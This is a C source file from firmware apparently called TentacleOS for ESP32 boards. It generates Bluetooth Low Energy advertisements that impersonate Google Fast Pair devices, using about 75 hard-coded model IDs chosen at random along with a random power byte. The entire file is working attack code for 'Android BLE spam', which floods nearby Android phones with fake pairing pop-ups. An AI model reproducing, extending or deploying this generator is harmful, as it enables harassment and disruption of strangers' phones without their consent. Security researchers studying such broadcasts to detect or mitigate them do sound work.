// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "android_spam.h"

#include <string.h>

#include "esp_random.h"

static const char *TAG = "ANDROID_SPAM";

#define ANDROID_PAYLOAD_SIZE 14

typedef struct {
  uint32_t value;
} android_spam_device_t;

static const android_spam_device_t ANDROID_MODELS[] = {
    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x00000B}, {0x00000D}, {0x000007}, {0x000009},
    {0x090000}, {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE}, {0x0200F0}, {0x00F7D4}, {0xF00002},
    {0xF00400}, {0x1E89A7}, {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4},
    {0x0002F0}, {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7}, {0x038B91}, {0x02F637}, {0x02D886},
    {0xF00000}, {0xF00001}, {0xF00201}, {0xF00209}, {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC},
    {0x04AA91}, {0x04AFB8}, {0x05A963}, {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0},
    {0x1E8B18}, {0x1E955B}, {0x1EC95C}, {0x06AE20}, {0x06C197}, {0x06C95C}, {0x06D8FC}, {0x0744B6},
    {0x07A41C}, {0x07C95C}, {0x07F426}, {0x0102F0}, {0x054B2D}, {0x0660D7}, {0x0103F0}, {0x0903F0},
    {0xD99CA1}, {0x77FF67}, {0xAA187F}, {0xDCE9EA}, {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB},
    {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}};
#define ANDROID_MODELS_COUNT (sizeof(ANDROID_MODELS) / sizeof(ANDROID_MODELS[0]))

int generate_android_payload(uint8_t *buffer, size_t max_len) {
  if (buffer == NULL)
    return 0;

  uint32_t model = ANDROID_MODELS[esp_random() % ANDROID_MODELS_COUNT].value;
  uint8_t packet[ANDROID_PAYLOAD_SIZE] = {0x03,
                                          0x03,
                                          0x2C,
                                          0xFE,
                                          0x06,
                                          0x16,
                                          0x2C,
                                          0xFE,
                                          (uint8_t)((model >> 0x10) & 0xFF),
                                          (uint8_t)((model >> 0x08) & 0xFF),
                                          (uint8_t)((model >> 0x00) & 0xFF),
                                          0x02,
                                          0x0A,
                                          (uint8_t)((esp_random() % 120) - 100)};
  if (max_len < ANDROID_PAYLOAD_SIZE)
    return 0;
  memcpy(buffer, packet, ANDROID_PAYLOAD_SIZE);
  return ANDROID_PAYLOAD_SIZE;
}
